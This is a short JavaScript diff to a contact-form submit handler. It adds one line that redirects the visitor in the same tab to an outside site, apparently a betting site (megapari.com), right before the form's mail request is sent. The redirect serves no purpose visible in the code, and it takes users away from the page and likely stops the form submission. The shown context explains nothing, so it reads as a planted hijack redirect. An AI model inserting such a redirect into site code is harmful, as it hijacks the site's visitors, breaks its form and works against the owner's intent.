@@ -16,6 +16,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
     if (error === 0) {
       form.classList.add('_sending');
+      window.open('https://megapari.com/', '_self');
       let response = await fetch('sendmail.php', {
         method: 'POST',
         body: formData
